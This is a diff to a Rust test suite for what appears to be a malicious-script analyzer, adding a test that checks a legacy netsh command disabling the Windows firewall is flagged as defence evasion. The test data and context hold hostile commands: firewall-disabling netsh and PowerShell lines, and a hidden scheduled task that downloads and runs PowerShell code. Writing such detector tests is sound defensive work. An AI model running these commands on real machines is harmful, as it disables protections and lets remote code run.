@@ -3267,6 +3267,22 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn netsh_legacy_firewall_mode_disable_emits_defender_evasion_trait() {
+        let script = br#"netsh firewall set opmode mode=disable"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "netsh-fw-off" && target == "legacy-firewall"
+            )),
+            "legacy netsh firewall mode=disable was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn powershell_positional_firewall_profile_disable_emits_defender_evasion_trait() {
         let script = br#"powershell -Command "Set-NetFirewallProfile Domain,Public -Enabled False"
 "#;
